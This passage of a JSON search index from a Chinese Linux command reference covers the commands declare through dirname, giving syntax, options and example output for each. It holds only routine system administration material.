MB/s\n```\n\n**生成随机字符串**\n\n我们甚至可以使用 /dev/urandom 设备配合 dd 命令 来获取随机字符串。\n\n```shell\n[root@localhost ~]# dd if=/dev/urandom bs=1 count=15|base64 -w 0\n15+0 records in\n15+0 records out\n15 bytes (15 B) copied, 0.000111993 s, 134 kB/s\nwFRAnlkXeBXmWs1MyGEs\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dd"]},{"title":"【Linux 命令】declare","url":"/linux-command/declare/","content":"\n声明变量，设置或显示变量的值和属性。\n\n## 语法\n\n```shell\ndeclare [-aAfFgilnrtux] [-p] [name[=value] ...]\n```\n\n## 主要用途\n\n- 显示包含指定属性的全部变量和值\n- 显示包含指定属性的一到多个变量和值\n- 显示一到多个变量的属性和值\n- 显示所有变量的属性和值并显示函数的定义\n- 显示所有变量的属性和值\n- 显示所有全局变量的属性和值\n- 显示全部函数名和函数定义\n- 只显示全部函数名\n- 显示一到多个函数名和函数定义\n- 只显示一到多个函数名\n- 声明全局变量（可选：赋值）\n- 声明变量（可选：赋值、属性）\n- 增加、删除变量的属性（可选：赋值）\n\n##  选项\n\n```shell\n-f 将操作或显示限制为函数名及函数定义。\n-F 只显示函数名（调试时附加行号和源文件）。\n-g 在shell函数中使用时创建全局变量；其他情况下忽略。\n-p 显示每个名称的属性和值。\n\n*设置属性的选项:\n-a 创建数组（如果支持）。\n-A 创建关联数组（如果支持）。\n-i 增加整型属性。\n+i 删除整型属性。\n-l 增加小写属性，变量的值将转换为小写。\n+l 删除小写属性。\n-n 增加引用属性（如果该选项存在）。\n+n 删除引用属性（如果该选项存在）。\n-r 增加只读属性。\n-t 增加追踪属性。\n+t 删除追踪属性。\n-u 增加大写属性，变量的值将转换为大写。\n+u 删除大写属性。\n-x 增加导出属性。\n+x 删除导出属性。\n```\n\n## 参数\n\n```shell\nname（可选）：变量名或函数名。\nvalue（可选）：变量的值。\n```\n\n## 返回值\n\ndeclare 返回true除非你提供了非法选项或赋值错误。具体导致异常的情况请查看**讨论**章节的**关于异常情况**。\n\n## 例子\n\n```shell\n# 声明变量，当然也欢迎您在这个网站（感谢本项目发起人 @jaywcjlove）查询linux命令。\ndeclare reference_website='https://wangchujiang.com/linux-command/'\n\n# 显示所有包含整型属性的变量和值。\ndeclare -i\n# 定义变量b并赋值为3，具有整型属性。\ndeclare -i b=5\n# 显示属性，返回 declare -i b=\"5\"。\ndeclare -p b\n# 删除整型属性。\ndeclare +i b\n# 显示属性，返回 declare -- b=\"5\"。\ndeclare -p b\n# 根据变量属性强制转换值的英文大小写。\ndeclare -u uc_var='abc'\ndeclare -l lc_var='ABC'\n# 显示'ABC abc';\necho \"${uc_var} ${lc_var}\"\n```\n\n```shell\n# 定义函数内的全局变量\nfunction test(){\n  declare -g a=3\n  # 或者\n  local -g b=3\n  # 或者\n  c=3\n  # 让我们查看它们的属性。\n  declare -p a b c\n}\n# 执行函数。\ntest\n# 返回结果。\n# declare -- a=\"3\"\n# declare -- b=\"3\"\n# declare -- c=\"3\"\n\n# 定义函数外的全局变量\ndeclare a=3\nb=3\ndeclare –p a b\n# 返回结果如下。\n# declare -- a=\"3\"\n# declare -- b=\"3\"\n\n# 定义局部变量\nfunction test2(){\n  local -i a=3\n  declare -i b=3\n}\ntest2\n# 没有该变量（已经被销毁了）\necho \"${a} ${b}\"\n# 因此，我们日常脚本中最常见的类似于'a=3'实际上是声明并赋值了一个全局变量。\n# 在接下来的 **讨论** 环节会延伸讨论全局和局部变量问题。\n```\n\n```shell\n# 注意，不能使用 `+a` 或 `+A` 取消数组，也不能使用 `+r` 取消只读属性。\n\n# 定义只读数组，设置属性的同时定义赋值。\ndeclare -ar season=('Spring' 'Summer' 'Autumn' 'Winter')\n# 或者这样。\nseason=('Spring' 'Summer' 'Autumn' 'Winter')\ndeclare -ar season\n# 显示所有数组。\ndeclare -a\n# 定义关联数组。\n\ndeclare -A fruits=(['apple']='red' ['banana']='yellow')\n# 显示所有关联数组。\ndeclare -A\n```\n\n```shell\n# 显示所有变量的属性和值并显示函数的定义，输出很长。\ndeclare\n# 显示所有变量的属性和值。\ndeclare -p\n# 显示所有全局变量的属性和值。\ndeclare -g\n```\n\n```shell\n# 显示全部函数名和函数定义。\ndeclare -f\n# 只显示全部函数名。\ndeclare -F\n\n# 定义两个函数。\nfunction func_a(){ echo $(date +\"%F %T\"); }\nfunction func_b(){ cd /; ls -lh --sort=time; }\n# 显示一到多个函数名和函数定义。\ndeclare -f func_a func_b\n# 只显示一到多个函数名，验证某个名称是否已经定义为函数时有用。\ndeclare -F func_a func_b\n# 最好不要让函数名和变量名相同。\n```\n\n\n## 讨论\n\n1. 全局和局部变量\n   \n   正如上面**例子**指出的情况，我们在日常编写程序的时候需要了解这些概念，在这里\n   做个简要地介绍，当然你也可以很方便的搜索到相关内容。\n   \n   - 全局变量：在整个脚本执行期间，只要没有被删除就**一直存在**。\n   - 局部变量：在函数内定义，函数执行后就被删除。\n   \n   建议函数内使用`local`命令，函数外使用`declare`命令。\n   \n   > *不要在脚本中定义过多的全局变量，那样可能会被其他函数调用造成意料之外的后果，并且也不方便检查出来。*\n   >\n   > *更不用说缺乏必要的注释了 —— ZhuangZhu-74*\n   \n   相关资料：\n   \n   - [google提供的编码规范](https://github.com/google/styleguide)\n   - [全局变量的讨论](https://unix.stackexchange.com/questions/381761/what-do-declare-name-and-declare-g-do)\n   \n2. 关于`declare` `typeset` `export` `local` `readonly`命令\n   \n   为什么`declare`能做到的事，还需要定义其他这些命令呢？\n   \n   因为这样语句含义会更加明确，例如：\n   - 设置导出属性的变量时，`export var`和`declare -x var`。\n   - 在函数内声明变量时，使用`local`。\n   - 声明只读变量，使用`readonly`。\n   \n   `typeset`和`declare`命令一样。\n   \n3. 关于异常情况\n\n   有多种原因导致`declare`失败，关于这些情况可以参考[bash在线文档declare部分\\(最新版\\)](https://www.gnu.org/software/bash/manual/bash.html#index-declare)，或执行 `info bash`\n   查看`declare`部分最后一大串`an attempt is`开头的句子。\n   \n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n2. 导出属性的相关介绍请查看'export'命令。\n3. 只读属性的相关介绍请查看'readonly'命令。\n4. 引用属性的相关介绍请查看'unset'命令的例子部分。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","declare"]},{"title":"【Linux 命令】depmod","url":"/linux-command/depmod/","content":"\n分析可载入模块的相依性\n\n## 补充说明\n\n**depmod命令** 可产生模块依赖的映射文件，在构建嵌入式系统时，需要由这个命令来生成相应的文件，由modprobe使用。\n\n###  语法\n\n```shell\ndepmod(选项)\n```\n\n###  选项\n\n```shell\n-a或--all：分析所有可用的模块；\n-d或debug：执行排错模式；\n-e：输出无法参照的符号；\n-i：不检查符号表的版本；\n-m<文件>或system-map<文件>：使用指定的符号表文件；\n-s或--system-log：在系统记录中记录错误；\n-v或--verbose：执行时显示详细的信息；\n-V或--version：显示版本信息；\n--help：显示帮助。\n```\n\n###  实例\n\n```shell\ndepmod -b /home/windsome/EMMA3PF-KernelSource-20080626/install_pos -e -F ./boot/System.map -v 2.6.18_pro500-bcm91250-mips2_fp_be -A -a\n```\n\n*   `/home/windsome/EMMA3PF-KernelSource-20080626/install_pos`是我`make mod_install`后，所有模块的存放路径。\n*   `./boot/System.map`是`make linux`后生成，我拷贝到此目录的。\n*   `2.6.18_pro500-bcm91250-mips2_fp_be`是我build的linux的版本。\n\n编译linux过程及执行depmod的例子：\n\n```shell\ngenkernel.sh (at linux-2.6.18_pro500)\n#######\nexport INSTALL_ROOT_EMMA3PF=\"/home/windsome/EMMA3PF-KernelSource-20080626/install_pos\"\nexport INSTALL_MOD_EMMA3PF=\"/home/windsome/EMMA3PF-KernelSource-20080626/install_pos\"\nrm /home/windsome/EMMA3PF-KernelSource-20080626/install_pos/lib -rf\nrm /home/windsome/EMMA3PF-KernelSource-20080626/install_pos/boot/* -rf\ncd <linux_src_dir>\nmake\nmake modules_install\ncp vmlinux System.map /home/windsome/EMMA3PF-KernelSource-20080626/install_pos/boot/ -p\ncd /home/windsome/EMMA3PF-KernelSource-20080626/install_pos\ndepmod -b /home/windsome/EMMA3PF-KernelSource-20080626/install_pos -e -F ./boot/System.map -v 2.6.18_pro500-bcm91250-mips2_fp_be -A -a\n```\n\n其他用法：\n\n在linux桌面系统中，当你编译了新的驱动，为了能够用`modprobe ***`加载模块, 你需要先将模块拷贝到`/lib/modules /2.6.31-20-generic`目录下，然后运行`sudo depmod -a`将模块信息写入modules.dep、modules.dep.bin、modules.alias.bin、modules.alias和modules.pcimap文件中。\n\n如，我编译了一个新的wifi驱动r8192se_pci.ko，将其拷贝到`/lib/modules/2.6.31-20-generic/wireless`下，然后到`/lib/modules/2.6.31-20-generic`运行`depmod -a`，之后可以在任意目录运行modprobe r8192se_pci。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","depmod"]},{"title":"【Linux 命令】df","url":"/linux-command/df/","content":"\n显示磁盘的相关信息\n\n## 补充说明\n\n**df命令** 用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。\n\n###  语法 \n\n```shell\ndf(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-a或--all：包含全部的文件系统；\n--block-size=<区块大小>：以指定的区块大小来显示区块数目；\n-h或--human-readable：以可读性较高的方式来显示信息；\n-H或--si：与-h参数相同，但在计算时是以1000 Bytes为换算单位而非1024 Bytes；\n-i或--inodes：显示inode的信息；\n-k或--kilobytes：指定区块大小为1024字节；\n-l或--local：仅显示本地端的文件系统；\n-m或--megabytes：指定区块大小为1048576字节；\n--no-sync：在取得磁盘使用信息前，不要执行sync指令，此为预设值；\n-P或--portability：使用POSIX的输出格式；\n--sync：在取得磁盘使用信息前，先执行sync指令；\n-t<文件系统类型>或--type=<文件系统类型>：仅显示指定文件系统类型的磁盘信息；\n-T或--print-type：显示文件系统的类型；\n-x<文件系统类型>或--exclude-type=<文件系统类型>：不要显示指定文件系统类型的磁盘信息；\n--help：显示帮助；\n--version：显示版本信息。\n```\n\n###  参数 \n\n文件：指定文件系统上的文件。\n\n### 大小格式\n\n显示值以 `--block-size` 和 `DF_BLOCK_SIZE`，`BLOCK_SIZE` 和 `BLOCKSIZE` 环境变量中的第一个可用 `SIZE` 为单位。 否则，单位默认为 `1024` 个字节（如果设置 `POSIXLY_CORRECT`，则为`512`）。\n\nSIZE是一个整数和可选单位（例如：10M是10 * 1024 * 1024）。 单位是K，M，G，T，P，E，Z，Y（1024的幂）或KB，MB，...（1000的幂）。\n\n###  实例 \n\n查看系统磁盘设备，默认是KB为单位：\n\n```shell\n[root@LinServ-1 ~]# df\n文件系统               1K-块        已用     可用 已用% 挂载点\n/dev/sda2            146294492  28244432 110498708  21% /\n/dev/sda1              1019208     62360    904240   7% /boot\ntmpfs                  1032204         0   1032204   0% /dev/shm\n/dev/sdb1            2884284108 218826068 2518944764   8% /data1\n```\n\n使用`-h`选项以KB以上的单位来显示，可读性高：\n\n```shell\n[root@LinServ-1 ~]# df -h\n文件系统              容量  已用 可用 已用% 挂载点\n/dev/sda2             140G   27G  106G  21% /\n/dev/sda1             996M   61M  884M   7% /boot\ntmpfs                1009M     0 1009M   0% /dev/shm\n/dev/sdb1             2.7T  209G  2.4T   8% /data1\n```\n\n查看全部文件系统：\n\n```shell\n[root@LinServ-1 ~]# df -a\n文件系统               1K-块        已用     可用 已用% 挂载点\n/dev/sda2            146294492  28244432 110498708  21% /\nproc                         0         0         0   -  /proc\nsysfs                        0         0         0   -  /sys\ndevpts                       0         0         0   -  /dev/pts\n/dev/sda1              1019208     62360    904240   7% /boot\ntmpfs                  1032204         0   1032204   0% /dev/shm\n/dev/sdb1            2884284108 218826068 2518944764   8% /data1\nnone                         0         0         0   -  /proc/sys/fs/binfmt_misc\n```\n\n显示 `public` 目录中的可用空间量，如以下输出中所示：\n\n```shell\ndf public\n# Filesystem     1K-blocks     Used Available Use% Mounted on\n# /dev/loop0      18761008 15246924   2554392  86% /d Avail\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","df"]},{"title":"【Linux 命令】dhclient","url":"/linux-command/dhclient/","content":"\n动态获取或释放IP地址\n\n## 补充说明\n\n**dhclient命令** 使用动态主机配置协议动态的配置网络接口的网络参数。\n\n###  语法\n\n```shell\ndhclient(选项)(参数)\n```\n\n###  选项\n\n```shell\n0：指定dhcp客户端监听的端口号；\n-d：总是以前台方式运行程序；\n-q：安静模式，不打印任何错误的提示信息；\n-r：释放ip地址。\n```\n\n###  参数\n\n网络接口：操作的网络接口。\n\n###  实例\n\n```shell\ndhclient -r     #释放IP\ndhclient        #获取IP\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dhclient"]},{"title":"【Linux 命令】dhcpd","url":"/linux-command/dhcpd/","content":"\n运行DHCP服务器\n\n###  语法\n\n```shell\ndhcpd [选项] [网络接口]\n```\n\n###  选项\n\n```shell\n-p <端口> 指定dhcpd监听的端口\n-f 作为前台进程运行dhcpd\n-d 启用调试模式\n-q 在启动时不显示版权信息\n-t 简单地测试配置文件的语法是否正确的，但不会尝试执行任何网络操作\n-T 可以用来测试租约数据库文件\n-4 运行DHCP服务器\n-6 运行DHCPv6服务器\n-s <服务器> 指定发送回复的服务器\n-cf <配置文件> 指定配置文件\n-lf <租约文件> 指定租约文件\n-pf <PID文件> 指定PID文件\n-tf <跟踪输出文件> 指定文件记录DHCP服务器的整个启动状态\n```\n\n### 例子\n\n对DHCP服务器进行排错。\n\n```shell\n[root@localhost ~]# dhcpd\nInternetSystems Consortium DHCP Server 4.1.1-P1\nCopyright2004-2010 Internet Systems Consortium.\nAll rightsreserved.\nFor info,please visit https://www.isc.org/software/dhcp/\nNot searchingLDAP since ldap-server, ldap-port and ldap-base-dn were not specified in theconfig file\nWrote 0deleted host decls to leases file.\nWrote 0 newdynamic host decls to leases file.\nWrote 1leases to leases file.\nListening onLPF/eth0/00:0c:29:fc:2f:e5/192.168.0.0/24\nSendingon  LPF/eth0/00:0c:29:fc:2f:e5/192.168.0.0/24\nSendingon   Socket/fallback/fallback-net\n[root@rhel~]# There's already a DHCP server running.\n \nThis versionof ISC DHCP is based on the release available\nonftp.isc.org.  Features have been addedand other changes\nhave beenmade to the base software release in order to make\nit workbetter with this distribution.\n \nexiting.\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dhcpd"]},{"title":"【Linux 命令】dhcrelay","url":"/linux-command/dhcrelay/","content":"\n使用dhcrelay命令可以提供中继DHCP和BOOTP请求\n\n## 补充说明\n\n**dhcrelay命令** 使用dhcrelay命令可以提供中继DHCP和BOOTP请求，从一个没有DHCP服务器的子网直接连接到其它子网内的一个或多个DHCP服务器。该命令在DHCP中继服务器上使用，同时支持DHCPv4/BOOTP和DHCPv6协议。\n\n###  语法\n\n```shell\ndhcrelay [选项] [DHCP服务器]\n```\n\n###  选项\n\n```shell\n-c <跳数> 当转发数据包时，dhcrelay丢弃已经达到一个最大跳数的数据包。默认值是10，最大值是255\n-4 运行dhcrelay命令作为DHCPv4/BOOTP中继代理。这是默认操作模式\n-6 运行dhcrelay命令作为DHCPv6中继代理\n-q 安静模式\n-p <端口> 监听和发送端口。DHCPv4/BOOTP默认端口是67，DHCPv6默认端口是547\n-A <长度> 指定发送到DHCP服务器的最大数据包大小\n-d 强制dhcrelay命令作为前台进程运行\n```\n\n### 例子\n\n指定DHCP服务器的位置。\n\n```shell\n[root@localhost ~]# dhcrelay 192.168.0.2\nInternet Systems Consortium DHCP Relay Agent4.1.1-P1\nCopyright 2004-2010 Internet SystemsConsortium.\nAll rights reserved.\nFor info, please visithttps://www.isc.org/software/dhcp/\nListening on LPF/eth1/00:0c:29:fc:2f:ef\nSending on  LPF/eth1/00:0c:29:fc:2f:ef\nListening on LPF/eth0/00:0c:27:fc:25:ec\nSending on  LPF/eth0/00:0c:27:fc:25:ec\nSending on  Socket/fallback\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dhcrelay"]},{"title":"【Linux 命令】diff","url":"/linux-command/diff/","content":"\n比较给定的两个文件的不同\n\n## 补充说明\n\n**diff命令** 在最简单的情况下，比较给定的两个文件的不同。如果使用“-”代替“文件”参数，则要比较的内容将来自标准输入。diff命令是以逐行的方式，比较文本文件的异同处。如果该命令指定进行目录的比较，则将会比较该目录中具有相同文件名的文件，而不会对其子目录文件进行任何比较操作。\n\n###  语法\n\n```shell\ndiff(选项)(参数)\n```\n\n###  选项\n\n```shell\n-<行数>：指定要显示多少行的文本。此参数必须与-c或-u参数一并使用；\n-a或——text：diff预设只会逐行比较文本文件；\n-b或--ignore-space-change：不检查空格字符的不同；\n-B或--ignore-blank-lines：不检查空白行；\n-c：显示全部内容，并标出不同之处；\n-C<行数>或--context<行数>：与执行“-c-<行数>”指令相同；\n-d或——minimal：使用不同的演算法，以小的单位来做比较；\n-D<巨集名称>或ifdef<巨集名称>：此参数的输出格式可用于前置处理器巨集；\n-e或——ed：此参数的输出格式可用于ed的script文件；\n-f或-forward-ed：输出的格式类似ed的script文件，但按照原来文件的顺序来显示不同处；\n-H或--speed-large-files：比较大文件时，可加快速度；\n-l<字符或字符串>或--ignore-matching-lines<字符或字符串>：若两个文件在某几行有所不同，而之际航同时都包含了选项中指定的字符或字符串，则不显示这两个文件的差异；\n-i或--ignore-case：不检查大小写的不同；\n-l或——paginate：将结果交由pr程序来分页；\n-n或——rcs：将比较结果以RCS的格式来显示；\n-N或--new-file：在比较目录时，若文件A仅出现在某个目录中，预设会显示：Only in目录，文件A 若使用-N参数，则diff会将文件A 与一个空白的文件比较；\n-p：若比较的文件为C语言的程序码文件时，显示差异所在的函数名称；\n-P或--unidirectional-new-file：与-N类似，但只有当第二个目录包含了第一个目录所没有的文件时，才会将这个文件与空白的文件做比较；\n-q或--brief：仅显示有无差异，不显示详细的信息；\n-r或——recursive：比较子目录中的文件；\n-s或--report-identical-files：若没有发现任何差异，仍然显示信息；\n-S<文件>或--starting-file<文件>：在比较目录时，从指定的文件开始比较；\n-t或--expand-tabs：在输出时，将tab字符展开；\n-T或--initial-tab：在每行前面加上tab字符以便对齐；\n-u，-U<列数>或--unified=<列数>：以合并的方式来显示文件内容的不同；\n-v或——version：显示版本信息；\n-w或--ignore-all-space：忽略全部的空格字符；\n-W<宽度>或--width<宽度>：在使用-y参数时，指定栏宽；\n-x<文件名或目录>或--exclude<文件名或目录>：不比较选项中所指定的文件或目录；\n-X<文件>或--exclude-from<文件>；您可以将文件或目录类型存成文本文件，然后在=<文件>中指定此文本文件；\n-y或--side-by-side：以并列的方式显示文件的异同之处；\n--help：显示帮助；\n--left-column：在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容；\n--suppress-common-lines：在使用-y参数时，仅显示不同之处。\n```\n\n###  参数\n\n*   文件1：指定要比较的第一个文件；\n*   文件2：指定要比较的第二个文件。\n\n###  实例\n\n将目录`/usr/li`下的文件\"test.txt\"与当前目录下的文件\"test.txt\"进行比较，输入如下命令：\n\n```shell\ndiff /usr/li test.txt     #使用diff指令对文件进行比较\n```\n\n上面的命令执行后，会将比较后的不同之处以指定的形式列出，如下所示：\n\n```shell\nn1 a n3,n4  \nn1,n2 d n3  \nn1,n2 c n3,n4 \n```\n\n其中，字母\"a\"、\"d\"、\"c\"分别表示添加、删除及修改操作。而\"n1\"、\"n2\"表示在文件1中的行号，\"n3\"、\"n4\"表示在文件2中的行号。\n\n注意：以上说明指定了两个文件中不同处的行号及其相应的操作。在输出形式中，每一行后面将跟随受到影响的若干行。其中，以<开始的行属于文件1，以>开始的行属于文件2。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","diff"]},{"title":"【Linux 命令】diff3","url":"/linux-command/diff3/","content":"\n比较3个文件不同的地方\n\n## 补充说明\n\n**diff3命令** 用于比较3个文件，将3个文件的不同的地方显示到标准输出。\n\n###  语法\n\n```shell\ndiff3(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：把所有的文件都当做文本文件按照行为单位进行比较，即给定的文件不是文本文件；\n-A：合并第2个文件和第3个文件之间的不同到第1个文件中，有冲突内容用括号括起来；\n-B：与选项“-A”功能相同，但是不显示冲突的内容；\n-e/--ed：生成一个“-ed”脚本，用于将第2个文件和第3个文件之间的不同合并到第1个文件中；\n--easy-only：除了不显示互相重叠的变化，与选项“-e”的功能相同；\n-i：为了和system V系统兼容，在“ed”脚本的最后生成“w”和“q”命令。此选项必须和选项“-AeExX3”连用，但是不能和“-m”连用；\n--initial-tab：在正常格式的行的文本前，输出一个TAB字符而非两个空白字符。此选项将导致在行中TAB字符的对齐方式看上去规范。\n```\n\n###  参数\n\n* 文件1：指定要比较的第1个文件；\n* 文件2：指定要比较的第2个文件；\n* 文件3：指定要比较的第3个文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","diff3"]},{"title":"【Linux 命令】diffstat","url":"/linux-command/diffstat/","content":"\n显示diff命令输出信息的柱状图\n\n## 补充说明\n\n**diffstat命令** 用来显示diff命令输出信息的柱状图，用以显示diff命令比较两个文件的不同统计信息。用户也可以直接使用`|`将diff命令所输出的结果直接送给diffstat命令进行统计结果的显示。使用该命令时，若所比较的文件或者子目录不在当前目录下，则应该使用其完整路径。\n\n###  语法\n\n```shell\ndiffstat(选项)(参数)\n```\n\n###  选项\n\n```shell\n-n<文件名长度>：指定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名；\n-p<文件名长度>：与-n参数相同，但此处的<文件名长度>包括了文件的路径；\n-w：指定要输出时栏位的宽度；\n-v：显示版本信息。\n```\n\n###  参数\n\n文件：指定保存有diff命令的输出信息文件。\n\n###  实例\n\n将目录\"test1\"和\"test2\"下的同名文件\"testf.txt\"使用diff命令进行比较。然后使用diffstat命令对结果进行统计显示，输入如下命令：\n\n```shell\ndiff test1 test2 | diffstat    #进行比较结果的统计显示\n```\n\n注意：使用这条命令可以非常方便地实现统计显示的功能。\n\n对于查看文件中的内容，用户可以通过cat命令进行查看即可，具体操作如下：\n\n```shell\ncat test1/testf.txt           #查看test1/testf的内容\nabc\ndef\nghi\njkl\nmno\npqr\nstu\nvws\n\ncat test2/testf.txt          #查看test2/testf的内容\nabc\ndef\nghi\njkl\nmno\n```\n\n从上面的文件内容显示，可以看到两个文件内容的差别。现在来运行刚才的命令，对文件比较的结果进行统计显示，结果如下：\n\n```shell\ntestfile | 2 +-             #统计信息输出显示\n1 file changed, 1 insertion(+), 1 deletion(-)\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","diffstat"]},{"title":"【Linux 命令】dig","url":"/linux-command/dig/","content":"\n域名查询工具\n\n## 补充说明\n\n**dig命令** 是常用的域名查询工具，可以用来测试域名系统工作是否正常。\n\n###  语法\n\n```shell\ndig(选项)(参数)\n```\n\n###  选项\n\n```shell\n@<服务器地址>：指定进行域名解析的域名服务器；\n-b<ip地址>：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；\n-f<文件名称>：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；\n-P：指定域名服务器所使用端口号；\n-t<类型>：指定要查询的DNS数据类型；\n-x<IP地址>：执行逆向域名查询；\n-4：使用IPv4；\n-6：使用IPv6；\n-h：显示指令帮助信息。\n```\n\n###  参数\n\n*   主机：指定要查询域名主机；\n*   查询类型：指定DNS查询的类型；\n*   查询类：指定查询DNS的class；\n*   查询选项：指定查询选项。\n\n###  实例\n\n```shell\n[root@localhost ~]# dig www.jsdig.com\n\n; <<>> DiG 9.3.6-P1-RedHat-9.3.6-20.P1.el5_8.1 <<>> www.jsdig.com\n;; global options:  printcmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2115\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 2, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;www.jsdig.com.               IN      A\n\n;; ANSWER SECTION:\nwww.jsdig.com.        0       IN      CNAME   host.1.jsdig.com.\nhost.1.jsdig.com.     0       IN      A       100.42.212.8\n\n;; AUTHORITY SECTION:\njsdig.com.            8       IN      NS      f1g1ns2.dnspod.net.\njsdig.com.            8       IN      NS      f1g1ns1.dnspod.net.\n\n;; Query time: 0 msec\n;; SERVER: 202.96.104.15#53(202.96.104.15)\n;; WHEN: Thu Dec 26 11:14:37 2013\n;; MSG SIZE  rcvd: 121\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dig"]},{"title":"【Linux 命令】dircolors","url":"/linux-command/dircolors/","content":"\n置ls命令在显示目录或文件时所用的色彩\n\n## 补充说明\n\n**dircolors命令** 设置ls命令在显示目录或文件时所用的色彩。dircolors可根据[色彩配置文件]来设置LS_COLORS环境变量或是显示设置LS_COLORS环境变量的命令。\n\n###  语法\n\n```shell\ndircolors(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b或--sh或--bourne-shell：显示在Boume shell中，将LS_COLORS设为目前预设置的shell指令；\n-c或--csh或--c-shell：显示在C shell中，将LS_COLORS设为目前预设置的shell指令；\n-p或--print-database：显示预设置；\n-help：显示帮助；\n-version：显示版本信息。\n```\n\n###  参数\n\n文件：指定用来设置颜色的文件。\n\n###  实例\n\n```shell\n[root@localhost ~]# dircolors -p\n# Configuration file for dircolors, a utility to help you set the\n# LS_COLORS environment variable used by GNU ls with the --color option.\n# The keywords COLOR, OPTIONS, and EIGHTBIT (honored by the\n# slackware version of dircolors) are recognized but ignored.\n# Below, there should be one TERM entry for each termtype that is colorizable\nTERM linux\nTERM linux-c\nTERM mach-color\nTERM console\nTERM con132x25\nTERM con132x30\nTERM con132x43\nTERM con132x60\nTERM con80x25\nTERM con80x28\nTERM con80x30\nTERM con80x43\nTERM con80x50\nTERM con80x60\nTERM cygwin\nTERM dtterm\nTERM putty\nTERM xterm\nTERM xterm-color\nTERM xterm-debian\nTERM rxvt\nTERM screen\nTERM screen-bce\nTERM screen-w\nTERM vt100\nTERM Eterm\n# Below are the color init strings for the basic file types. A color init\n# string consists of one or more of the following numeric codes:\n# Attribute codes:\n# 00=none 01=bold 04=underscore 05=blink 07=reverse 08=concealed\n# Text color codes:\n# 30=black 31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 37=white\n# Background color codes:\n# 40=black 41=red 42=green 43=yellow 44=blue 45=magenta 46=cyan 47=white\nNORMAL 00 # global default, although everything should be something.\nFILE 00 # normal file\nDIR 01;34 # directory\nLINK 01;36 # symbolic link. (If you set this to 'target' instead of a\n # numerical value, the color is as for the file pointed to.)\nFIFO 40;33 # pipe\nSOCK 01;35 # socket\nDOOR 01;35 # door\nBLK 40;33;01 # block device driver\nCHR 40;33;01 # character device driver\nORPHAN 40;31;01 # symlink to nonexistent file\nSETUID 37;41 # file that is setuid (u+s)\nSETGID 30;43 # file that is setgid (g+s)\nSTICKY_OTHER_WRITABLE 30;42 # dir that is sticky and other-writable (+t,o+w)\nOTHER_WRITABLE 34;42 # dir that is other-writable (o+w) and not sticky\nSTICKY 37;44 # dir with the sticky bit set (+t) and not other-writable\n# This is for files with execute permission:\nexec 01;32\n# List any file extensions like '.gz' or '.tar' that you would like ls\n# to colorize below. Put the extension, a space, and the color init string.\n# (and any comments you want to add after a '#')\n# If you use DOS-style suffixes, you may want to uncomment the following:\n#.cmd 01;32 # executables (bright green)\n#.exe 01;32\n#.com 01;32\n#.btm 01;32\n#.bat 01;32\n.tar 01;31 # archives or compressed (bright red)\n.tgz 01;31\n.arj 01;31\n.taz 01;31\n.lzh 01;31\n.zip 01;31\n.z 01;31\n.Z 01;31\n.gz 01;31\n.bz2 01;31\n.deb 01;31\n.rpm 01;31\n.jar 01;31\n# image formats\n.jpg 01;35\n.jpeg 01;35\n.gif 01;35\n.bmp 01;35\n.pbm 01;35\n.pgm 01;35\n.ppm 01;35\n.tga 01;35\n.xbm 01;35\n.xpm 01;35\n.tif 01;35\n.tiff 01;35\n.png 01;35\n.mov 01;35\n.mpg 01;35\n.mpeg 01;35\n.avi 01;35\n.fli 01;35\n.gl 01;35\n.dl 01;35\n.xcf 01;35\n.xwd 01;35\n# audio formats\n.flac 01;35\n.mp3 01;35\n.mpc 01;35\n.ogg 01;35\n.wav 01;35\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dircolors"]},{"title":"【Linux 命令】dirname","url":"/linux-command/dirname/","content":"\n去除文件名中的非目录部分\n\n## 补充说明\n\n**dirname命令** 去除文件名中的非目录部分，仅显示与目录有关的内容。dirname命令读取指定路径名保留最后一个`/`及其后面的字符，删除其他部分，并写结果到标准输出。如果最后一个`/`后无字符，dirname 命令使用倒数第二个`/`，并忽略其后的所有字符。dirname 和 basename 通常在 shell 内部命令替换使用，以指定一个与指定输入文件名略有差异的输出文件名。\n\n###  语法\n\n```shell\ndirname(选项)(参数)\n```\n\n###  选项\n\n```shell\n--help：显示帮助；\n--version：显示版本号。\n```\n\n###  实例\n\n```shell\ndirname //\n结果为 /\n\ndirname /a/b/\n结果为：/a\n\ndirname a\n结果为 .\n\ndirname a/b\n结果为路径名 a\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dirname"]},{"title":"【Linux 命令】dirs","url":"/linux-command/dirs/","content":"\n显示目录堆栈。\n\n## 概要\n\n```shell\ndirs [-clpv] [+N] [-N]\n```\n\n## 主要用途\n\n- 显示目录堆栈。\n\n- 清空目录堆栈。\n\n## 选项\n\n```shell\n-c    